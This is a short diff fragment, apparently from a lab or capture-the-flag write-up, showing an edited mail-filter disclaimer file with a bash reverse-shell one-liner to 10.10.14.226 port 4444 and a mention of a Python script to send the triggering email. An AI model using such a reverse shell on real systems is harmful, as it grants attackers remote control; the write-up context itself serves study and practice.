@@ -275,6 +275,7 @@ Edited disclaimer file:
 bash -i >& /dev/tcp/10.10.14.226/4444 0>&1
 INSPECT_DIR=/var/spool/filter
 SENDMAIL=/usr/sbin/sendmail
+...
 ```
 
 Python script to send the email:
